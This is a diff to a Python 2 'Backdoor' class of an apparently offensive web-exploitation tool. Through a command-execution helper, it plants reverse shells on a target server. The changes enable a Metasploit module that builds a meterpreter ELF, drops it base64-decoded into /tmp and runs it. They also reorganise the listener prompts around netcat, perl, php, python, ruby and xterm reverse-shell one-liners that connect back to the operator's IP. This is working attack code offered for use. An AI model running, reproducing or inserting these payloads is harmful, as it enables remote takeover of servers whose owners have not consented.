@@ -18,7 +18,7 @@ class Backdoor(object):
         print '[i] Modules:'
         #print '[i] \t*bash   \t\tUse bash to create a reverse shell (not all versions support this!)'
         #print '[i] \t*java   \t\tUse java to create a reverse shell'
-        #print '[i] \t*msf    \t\tUse a PHP metereter to create a reverse shell'
+        print '[i] \t*msf    \t\tUse a PHP metereter to create a reverse shell'
         print '[i] \t*netcat \t\tUse netcat traditional to create a reverse shell (not netcat openbsd)'
         print '[i] \t*perl   \t\tUse perl to create a reverse shell'
         #print '[i] \t*php    \t\tUse php-cli to create a reverse shell'
@@ -38,11 +38,12 @@ class Backdoor(object):
         if len(Popen("for x in `whereis msfvenom`; do file $x | grep symbolic; done", shell=True, stdout=PIPE).stdout.read().strip()) == 0:
             print '\n{0}[!] Wasn\'t able to detect the metasploit framework{1}'.format(Colors.RED, Colors.END)
         else:
-            #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-            print '\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3}\n[?] Press <return> when ready! (hint: msfcli LHOST={1} LPORT={2) E){3}'.format(Colors.GREEN,ip, port, Colors.END)
+            print '\n{0}[i] Found the metasploit framework!'.format(Colors.GREEN, Colors.END)
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST={1} LPORT={2} E)\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
             print '[i] Generating linux/x86/meterpreter/reverse_tcp'
-            shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
-            cmd = '{0} {1} {2} -e /bin/bash'.format(shell, ip, port)
+            #phpshell = Popen('msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -e php/base64 -f raw'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
+            shell = Popen('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf | base64'.format(ip, port), shell=True, stdout=PIPE).stdout.read().strip()
+            cmd = 'echo "{0}" | base64 -i -d > /tmp/1 && chmod +x /tmp/1 && nohup /tmp/1 &'.format(shell)
             self.check = make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
 
@@ -56,11 +57,12 @@ class Backdoor(object):
         netcat = make_request.get_page_source(cmd)
         if netcat:
             print '\n{0}[i] Found netcat!'.format(Colors.GREEN, Colors.END)
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3}\n[?] Press <return> when ready! '.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
             for path in netcat:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            for path in netcat:
                 cmd = 'nohup {0} {1} {2} -e /bin/bash &'.format(path, ip, port)
                 make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
@@ -72,11 +74,12 @@ class Backdoor(object):
         perl = make_request.get_page_source(cmd)
         if perl:
             print '\n{0}[i] Found perl!'.format(Colors.GREEN, Colors.END)
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3}\n[?] Press <return> when ready! '.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
             for path in perl:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            for path in perl:
                 cmd = 'nohup {0} -e '.format(path)
                 cmd += '\'use Socket;'
                 cmd += '$i="{0}";'.format(ip)
@@ -94,11 +97,12 @@ class Backdoor(object):
         php = make_request.get_page_source(cmd)
         if php:
             print '\n{0}[i] Found php-cli!'.format(Colors.GREEN, Colors.END)
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3}\n[?] Press <return> when ready! '.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
             for path in php:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            for path in php:
                 cmd = 'nohup {0} -r '.format(path)
                 cmd += '\'$sock=fsockopen("{0}",{1});'.format(ip, port)
                 cmd += 'exec("/bin/sh -i <&3 >&3 2>&3");\' &'
@@ -112,11 +116,12 @@ class Backdoor(object):
         python = make_request.get_page_source(cmd)
         if python:
             print '\n{0}[i] Found python!'.format(Colors.GREEN, Colors.END)
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3}\n[?] Press <return> when ready! '.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
             for path in python:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            for path in python:
                 cmd = 'nohup {0} -c '.format(path)
                 cmd += '\'import socket,subprocess,os;'
                 cmd += 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM);'
@@ -135,11 +140,12 @@ class Backdoor(object):
         ruby = make_request.get_page_source(cmd)
         if ruby:
             print '\n{0}[i] Found ruby!'.format(Colors.GREEN, Colors.END)
-            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3}\n[?] Press <return> when ready! '.format(Colors.GREEN, ip, port, Colors.END))
             c = 1
             for path in ruby:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            for path in ruby:
                 cmd = 'nohup {0} -rsocket -e'.format(path)
                 cmd += '\'f=TCPSocket.open("{0}",{1}).to_i;'.format(ip, port)
                 cmd += 'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\' &'
@@ -174,6 +180,8 @@ class Backdoor(object):
             for path in xterm:
                 print '{0}{1:2d}- {2} {3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
+            raw_input('\n{0}[i] Make sure: \'{1}\' has a listener shell setup on port: \'{2}\'{3} (hint: nc -lvvp {2})\n{0}[?] Press <return> when ready!{3}'.format(Colors.GREEN, ip, port, Colors.END))
+            for path in xterm:
                 cmd = 'nohup {0} xterm -display {1}:1 &'.format(path, ip)
                 make_request.get_page_source(cmd)
             print '{0}[+] Done!{1}'.format(Colors.HOT, Colors.END)
